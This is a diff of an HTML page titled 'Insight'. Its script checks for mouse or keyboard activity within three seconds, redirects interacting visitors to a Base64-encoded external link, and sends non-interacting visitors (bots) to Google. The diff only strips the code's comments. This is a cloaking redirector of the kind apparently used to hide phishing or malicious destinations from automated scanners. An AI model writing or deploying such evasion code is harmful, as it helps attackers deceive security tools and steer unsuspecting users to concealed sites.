@@ -6,11 +6,11 @@
   <title>Insight</title>
   <script>
     document.addEventListener("DOMContentLoaded", function () {
-      const timeoutDuration = 3000; // Timeout duration in milliseconds
+      const timeoutDuration = 3000; // 
       const mainUrl = "aHR0cHM6Ly9zZW1pLXpjbXAubWFpbGxpc3QtbWFuYWdlLmNvbS9jbGljay8xMTM0ZDFiNjk4ODU0NjJkZi8xMTM0ZDFiNjk4ODU0NWYyNw==";
       const botUrl = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==";
 
-      // Decode Base64 URLs
+      // 
       const decodeUrl = (encodedUrl) => atob(encodedUrl);
 
       const isHuman = () => {
@@ -20,16 +20,16 @@
           const interactionListener = () => {
             interacted = true;
             resolve(true);
-            // Clean up event listeners
+            // 
             window.removeEventListener("mousemove", interactionListener);
             window.removeEventListener("keydown", interactionListener);
           };
 
-          // Attach listeners for human interaction
+          //
           window.addEventListener("mousemove", interactionListener);
           window.addEventListener("keydown", interactionListener);
 
-          // Fallback to bot if no interaction is detected within the timeout
+          //
           setTimeout(() => {
             if (!interacted) resolve(false);
           }, timeoutDuration);
@@ -42,7 +42,7 @@
         window.location.href = targetUrl;
       }).catch((err) => {
         console.error("Error determining user type:", err);
-        window.location.href = decodeUrl(botUrl); // Fallback to bot URL
+        window.location.href = decodeUrl(botUrl); //
       });
     });
   </script>
